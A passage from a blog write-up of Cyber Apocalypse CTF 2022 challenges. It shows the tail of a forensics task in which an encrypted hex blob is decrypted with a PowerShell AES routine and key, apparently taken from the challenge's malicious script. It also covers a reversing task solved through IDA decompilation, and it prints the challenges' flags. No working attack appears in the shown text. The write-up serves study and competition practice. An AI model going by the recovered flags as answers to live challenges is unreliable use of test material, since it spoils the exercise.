<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CC1C9AC2958A2E63609272E2B4F8F43632A806549B03AB7E4EB39771AEDA4A1BC1006AC8A03F9776B08321BD6D5247BB7679895D1CF7C07BB6A348E1AA4AFC655958A6856F1A34AAD5E97EA55B08767035F2497E5836EA0ECA1F1280F59742A309E28DD82C14BC32513652DAC2F2C27B0D73A3288A980D8FCEF94BDDCF9E28222A1CA17BB2D90FCD615885634879041420FC39C684A9E371CC3A06542B6660055840BD94CCE65E23613925B4D9D2BA5318EA75BC653004D45D505ED62567017A6FA4E7593D83092F67A81082D9930E99BA20E34AACC4774F067442C6622F5DA2A9B09FF558A8DF000ECBD37804CE663E3521599BC7591005AB6799C57068CF0DC6884CECF01C0CD44FD6B82DB788B35D62F02E4CAA1D973FBECC235AE9F40254C63D3C93C89930DA2C4F42D9FC123D8BAB00ACAB5198AFCC8C6ACD81B19CD264CC6353668CEA4C88C8AEEA1D58980022DA8FA2E917F17C28608818BF550FEA66973B5A8355258AB0AA281AD88F5B9EB103AC666FE09A1D449736335C09484D271C301C6D5780AB2C9FA333BE3B0185BF071FB1205C4DBEAA2241168B0748902A6CE14903C7C47E7C87311044CB9873A4ECABC349D27C0B0FFFD1ACEEDBE06BB6C2EB000EE4F9B35D6F001500E85642A2DCC8F1BE2CF4D667F458C1DE46D24B1C2E0F5D94E52649C70402C1B0A2FF7B49FC32DDD67F275307A74B2C4D0864B3F0486186DA9443EB747F717B3911C959DC7E300844D60655410C3988238E615D616F33D27F63CE4D1E065A416911BC50D458749599D2CB08DB561988EB2902E05D9886FDDAC2BED6F6DA73637AD2F20CF199B8CE3D9DEE03C0180C7D1198B49C02769E5EE4EAB896D7D3BB478EA140816779472A243BFB0852AF372323EC1329883C81A3F2AEB1D3DAAE8496E1DBF97F435AE40A09203B890C4A174D77CB7026C4E990A6FB6424A7501823AD31D3D6B6344C7971C8D447C078C4471732AD881C394BC8B1A66E0BED43DDC359269B57D1D5D68DCD2A608BF61716BB47D6FE4D5C9D6E8BB2981F214A8234B0DD0210CA96EB2D6322B0F7F3D748C4C9F8B80EFF5A6921A3D1A8621A49F4D29BC9851D25230B841BDB4E9E5F8BF721B58E8308177B572E9A015967DA5BF11AC9155FC2159C8F610CD82F818B4BDF5E48722DAF4BEEEBABCE30583F503B484BF99020E28A1B8F282A23FEB3A21C3AD89882F5AC0DD3D57D87875231652D0F4431EC37E51A09D57E2854D11003AB6E2F4BFB4F7E2477DAA44FCA3BC6021777F03F139D458C0524AE4ABE8A3A88D21DEEA071A72D65A35EF158D9F025897D1843E37B7463EC7833</span><br></pre></td></tr></table></figure>

<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F63a58d92-5d6c-4f34-a4b8-746a134e26b1%2FUntitled.png?id=3027fba5-b876-4b3a-bf49-2cfb8f9de869&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p>
<p>Now how can we decode this ?</p>
<p>It’s so simple , we know the type of the encryption being used which is <code>AES</code> , we also know the IV which is the first 16 bytes of our hex value according to the script</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">`function Decrypt<span class="literal">-String</span>(<span class="variable">$key</span>, <span class="variable">$encryptedStringWithIV</span>) &#123;</span><br><span class="line">    <span class="variable">$bytes</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$encryptedStringWithIV</span>)</span><br><span class="line">    <span class="variable">$IV</span> = <span class="variable">$bytes</span>[<span class="number">0</span><span class="type">..15</span>]</span><br><span class="line">    <span class="variable">$aesManaged</span> = Create<span class="literal">-AesManagedObject</span> <span class="variable">$key</span> <span class="variable">$IV</span></span><br><span class="line">    <span class="variable">$decryptor</span> = <span class="variable">$aesManaged</span>.CreateDecryptor();</span><br><span class="line">    <span class="variable">$unencryptedData</span> = <span class="variable">$decryptor</span>.TransformFinalBlock(<span class="variable">$bytes</span>, <span class="number">16</span>, <span class="variable">$bytes</span>.Length - <span class="number">16</span>);</span><br><span class="line">    <span class="variable">$aesManaged</span>.Dispose()</span><br><span class="line">    [<span class="type">System.Text.Encoding</span>]::UTF8.GetString(<span class="variable">$unencryptedData</span>).Trim([<span class="built_in">char</span>]<span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IV</span> = CC1C9AC2958A2E63609272E2B4F8F436</span><br></pre></td></tr></table></figure>

<p>We know the key being used to encrypt which is </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span> = <span class="string">&quot;a1E4MUtycWswTmtrMHdqdg==&quot;</span></span><br></pre></td></tr></table></figure>

<p>Let’s throw everything into <strong>Cyberchef</strong> </p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F96d88494-7a8f-49ec-a423-0cb994128237%2FUntitled.png?id=57b6d822-aa91-4730-a37a-7b8ede795f13&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p>
<p>And there we go , we got our second part of the flag.</p>
<p><code>$part2=4utom4t3_but_y0u_c4nt_h1de&#125;</code></p>
<p><strong>Full flag :</strong></p>
<p><code>HTB&#123;y0u_c4n_4utom4t3_but_y0u_c4nt_h1de&#125;</code></p>
<hr>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a><strong>Conclusion</strong></h2><p>I really liked the forensics challenges, they are really high quality. I learnt a lot of new things in the process of solving them. Kudos to the author.</p>
<hr>
<h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><h2 id="Omega-One"><a href="#Omega-One" class="headerlink" title="Omega One"></a><strong>Omega One</strong></h2><h3 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You&#x27;ve been sent to the library planet Omega-One. Here, records from all over the galaxy are collected, sorted and archived with perfect efficiency. You need to retrieve records about Draeger&#x27;s childhood, but the interface is impossibly large. Can you unravel the storage system?</span><br></pre></td></tr></table></figure>

<p>We are given a binary file and an output.txt file </p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F1656544a-9c4b-41d5-b93f-69aee6f7e459%2FUntitled.png?id=72ae14e6-ba85-457d-927d-793db51ec972&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=530&userId=&cache=v2" alt="Untitled"></p>
<p><strong>omega-one binary</strong> </p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fcd26ef2c-bf96-4380-8033-2b5b3b88207a%2FUntitled.png?id=96762800-8422-4fd4-9614-2b840f795533&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="reversing"></p>
<p>This is the content of the <strong>output.txt</strong> file </p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe489af28-d549-4493-8fd6-5907f73f5752%2FUntitled.png?id=3c4d62f2-a540-4e34-883d-cd02c1d9efcc&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1390&userId=&cache=v2" alt="reversing"></p>
<p>Let’s open the binary in IDA and take a look at it.</p>
<p>This is the decompiled code for the <strong>main</strong> function </p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F346b3c0c-5ebd-4290-a39f-00945f94f5a8%2FUntitled.png?id=6d5e5509-4163-43cf-88ce-c2a1272fad44&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1700&userId=&cache=v2" alt="reversing"></p>
<p>If we take a look at it we notice that there are characters that map to some words. </p>
<p>After spending sometime reading through different functions , I noticed something, If we look at the names in output.txt file we can find that the first 4 names map to the characters H,T,B and { respectively which is the beginning of the flag. </p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F71182384-0d6d-46bc-bde7-db4dc054456c%2FUntitled.png?id=3dd5a756-2d70-4daa-998a-fd61c7df90cc&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1210&userId=&cache=v2" alt="reversing"></p>
<p>I did go through all the main function and assigned each name in output.txt with the corresponding character. The result was</p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbf90fcd3-a111-4ae8-8616-3d478a5877ca%2FUntitled.png?id=468ff1a5-7071-40f7-acc7-ed1ab4a0386b&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1020&userId=&cache=v2" alt="reversing"></p>
<p><code>Flag : HTB&#123;l1n34r_t1m3_but_pr3tty_sl0w!&#125;</code></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://seriotonctf.github.io">serioton</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://seriotonctf.github.io/2022/05/19/Cyber-Apocalypse-CTF-2022-Writeups/">https://seriotonctf.github.io/2022/05/19/Cyber-Apocalypse-CTF-2022-Writeups/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/forensics/">forensics</a><a class="post-meta__tags" href="/tags/reversing/">reversing</a><a class="post-meta__tags" href="/tags/HTB/">HTB</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/07/22/DiceCTF-HOPE-Writeups/" title="DiceCTF @ HOPE Writeups"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F222053e3-c01e-49bd-b8bb-45dd6f01137b%2FUntitled.png?id=24e6641f-935d-4667-98de-f38922b1865a&amp;table=block&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=2000&amp;userId=&amp;cache=v2" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">DiceCTF @ HOPE Writeups</div></div></a></div><div class="next-post pull-right"><a href="/2022/05/15/TJCTF-2022-Writeups/" title="TJCTF 2022 Writeups"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F85dda850-6283-4ec5-9827-874ee5b97dc8%2FUntitled.png?id=41004841-d892-4022-8e39-620aa1c8c959&amp;table=block&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=2000&amp;userId=&amp;cache=v2" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">TJCTF 2022 Writeups</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/10/11/Black-Hat-MEA-CTF-2023-Writeups/" title="Black Hat MEA CTF 2023 Writeups"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F1efa221e-54c8-4d14-810f-2badbfeec66e%2Ffinal_result_blackhat_mea_2023.png?table=block&id=483b333c-eb72-453a-bf11-3330fb0cb71d&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-11</div><div class="title">Black Hat MEA CTF 2023 Writeups</div></div></a></div><div><a href="/2022/05/15/TJCTF-2022-Writeups/" title="TJCTF 2022 Writeups"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F85dda850-6283-4ec5-9827-874ee5b97dc8%2FUntitled.png?id=41004841-d892-4022-8e39-620aa1c8c959&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-15</div><div class="title">TJCTF 2022 Writeups</div></div></a></div><div><a href="/2022/03/27/WolvSec-CTF-2022-Writeups/" title="WolvSec CTF 2022 Writeups"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9e69e34b-94a7-4535-b2b0-cc19bbea3b3f%2Fflaggy.jpg?id=1e9bf826-2b8e-4af9-bbcd-9833120595e5&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1070&userId=&cache=v2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-27</div><div class="title">WolvSec CTF 2022 Writeups</div></div></a></div><div><a href="/2023/05/06/WaniCTF-2023-Writeups/" title="WaniCTF 2023 Writeups"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F4540db69-55b2-4b7b-8b73-857134e39c95%2FUntitled.png?id=a19cfd06-b13e-466f-b080-9f85693a2ffb&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-06</div><div class="title">WaniCTF 2023 Writeups</div></div></a></div><div><a href="/2022/05/04/angstromCTF-2022-Writeups/" title="ångstromCTF 2022 Writeups"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F502b841b-6405-413c-9417-dd7e38d6847b%2FUntitled.png?id=260e4542-1f0d-4ceb-a93a-daad28e86bc5&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1830&userId=&cache=v2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-04</div><div class="title">ångstromCTF 2022 Writeups</div></div></a></div><div><a href="/2022/07/22/DiceCTF-HOPE-Writeups/" title="DiceCTF @ HOPE Writeups"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F222053e3-c01e-49bd-b8bb-45dd6f01137b%2FUntitled.png?id=24e6641f-935d-4667-98de-f38922b1865a&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-22</div><div class="title">DiceCTF @ HOPE Writeups</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/cat.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">serioton</div><div class="author-info__description">cat</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://twitter.com/seriotonctf"><i class="fab fa-twitter"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/seriotonctf" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://twitter.com/seriotonctf" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">A blog where I share writeups of machines and CTF challenges</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensics"><span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Puppeteer"><span class="toc-text">Puppeteer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-Description"><span class="toc-text">Challenge Description</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Golden-Persistence"><span class="toc-text">Golden Persistence</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-Description-1"><span class="toc-text">Challenge Description</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Automation"><span class="toc-text">Automation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-Description-2"><span class="toc-text">Challenge Description</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-text">Conclusion</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reversing"><span class="toc-text">Reversing</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Omega-One"><span class="toc-text">Omega One</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-Description-3"><span class="toc-text">Challenge Description</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/06/26/ADCS-Attacks-with-Certipy/" title="ADCS Attacks with Certipy"><img src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F55bd30fb-924f-4b62-8c2d-8ef5b2b0bc34%2Fcat.png?table=block&amp;id=35840b9b-8958-455b-83ed-312be6e09422&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=2000&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ADCS Attacks with Certipy"/></a><div class="content"><a class="title" href="/2024/06/26/ADCS-Attacks-with-Certipy/" title="ADCS Attacks with Certipy">ADCS Attacks with Certipy</a><time datetime="2024-06-26T15:42:13.000Z" title="Created 2024-06-26 15:42:13">2024-06-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/05/28/Escape-Vulnlab/" title="Escape - Vulnlab"><img src="https://wiki.vulnlab.com/~gitbook/image?url=https%3A%2F%2F3528174365-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FI3I73FFqB6GvT8N5Mt1N%252Fuploads%252Ft12lXmil2VV0iVqncZnv%252Fescape_slide.png%3Falt%3Dmedia%26token%3Dce1f8941-c579-4d9a-bb57-ea6de1e5252b&amp;width=768&amp;dpr=1&amp;quality=100&amp;sign=642a654e4f3d5c89f5bd79724228f6521b285446f0055d8b5050aced207fd1f8" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Escape - Vulnlab"/></a><div class="content"><a class="title" href="/2024/05/28/Escape-Vulnlab/" title="Escape - Vulnlab">Escape - Vulnlab</a><time datetime="2024-05-28T18:57:00.000Z" title="Created 2024-05-28 18:57:00">2024-05-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/17/Sendai-Vulnlab/" title="Sendai - Vulnlab"><img src="https://3528174365-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FI3I73FFqB6GvT8N5Mt1N%2Fuploads%2FRRPTVaY8c7dGLUP6fFBH%2Fsendai_slide.png?alt=media&amp;token=b35b5833-3b44-4447-8151-0357cc2440ea&amp;width=400&amp;dpr=2&amp;quality=100&amp;sign=c62763d9c8fa3c3127537f3446c48cc764dc145cc28413a9cc3a2c16202f1376" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Sendai - Vulnlab"/></a><div class="content"><a class="title" href="/2024/03/17/Sendai-Vulnlab/" title="Sendai - Vulnlab">Sendai - Vulnlab</a><time datetime="2024-03-17T17:13:40.000Z" title="Created 2024-03-17 17:13:40">2024-03-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/07/CrackMapExec-and-NetExec-Cheat-Sheet/" title="CrackMapExec and NetExec Cheat Sheet"><img src="https://repository-images.githubusercontent.com/689013903/3d0fa9de-9232-4caa-9a01-a80ebca9dc9c" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CrackMapExec and NetExec Cheat Sheet"/></a><div class="content"><a class="title" href="/2024/03/07/CrackMapExec-and-NetExec-Cheat-Sheet/" title="CrackMapExec and NetExec Cheat Sheet">CrackMapExec and NetExec Cheat Sheet</a><time datetime="2024-03-07T14:11:05.000Z" title="Created 2024-03-07 14:11:05">2024-03-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/20/Lock-Vulnlab/" title="Lock - Vulnlab"><img src="https://1897091482-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FI3I73FFqB6GvT8N5Mt1N%2Fuploads%2FqlrTgqfYZ2LxYiFsS7F0%2Flock_slide.png?alt=media&amp;token=4a34abe6-3e20-4725-9334-bd39e2db903a" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Lock - Vulnlab"/></a><div class="content"><a class="title" href="/2024/01/20/Lock-Vulnlab/" title="Lock - Vulnlab">Lock - Vulnlab</a><time datetime="2024-01-20T18:44:31.000Z" title="Created 2024-01-20 18:44:31">2024-01-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/train_travel_illustration-wallpaper-1920x1080.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By serioton</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">ฅ^•ﻌ•^ฅ</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div></div></body></html>